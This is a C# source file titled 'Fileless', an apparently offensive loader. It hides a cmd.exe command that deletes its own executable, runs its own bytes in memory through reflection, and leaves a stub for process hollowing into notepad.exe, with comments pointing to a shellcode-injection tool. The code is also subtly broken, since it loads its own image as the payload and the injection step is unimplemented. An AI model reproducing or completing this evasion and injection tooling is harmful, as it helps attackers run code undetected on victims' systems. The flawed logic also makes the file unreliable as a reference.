using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Reflection;

namespace Fileless
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            byte[] rawAssembly = File.ReadAllBytes(exePath);

            // Self-delete after short delay
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c ping 127.0.0.1 -n 2 > nul & del \"{exePath}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });

            // Determine if .NET or native PE
            if (IsDotNetAssembly(rawAssembly))
            {
                Console.WriteLine("[.NET] Executing in memory via reflection");
                ExecuteDotNetFromMemory(rawAssembly);
            }
            else
            {
                Console.WriteLine("[NATIVE] Injecting into 64-bit notepad.exe");
                InjectNativePE(rawAssembly, "notepad.exe");
            }
        }

        static bool IsDotNetAssembly(byte[] fileBytes)
        {
            try
            {
                Assembly.Load(fileBytes);
                return true;
            }
            catch { return false; }
        }

        static void ExecuteDotNetFromMemory(byte[] asmBytes)
        {
            try
            {
                Assembly asm = Assembly.Load(asmBytes);
                MethodInfo entry = asm.EntryPoint;
                object instance = null;

                if (!entry.IsStatic)
                    instance = asm.CreateInstance(entry.DeclaringType.FullName);

                entry.Invoke(instance, new object[] { new string[] { } });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Reflection exec failed: {ex.Message}");
            }
        }

        static void InjectNativePE(byte[] payload, string targetProcess)
        {
            // This method should call a full 64-bit process hollowing implementation
            // For brevity, pseudo-code is inserted here

            Console.WriteLine("[*] InjectNativePE stub - implement full 64-bit process hollowing here.");

            // You can use a native C injector or port a full reflective loader
            // Consider Donut (https://github.com/TheWover/donut) for real-world .NET -> shellcode injection
        }
    }
}
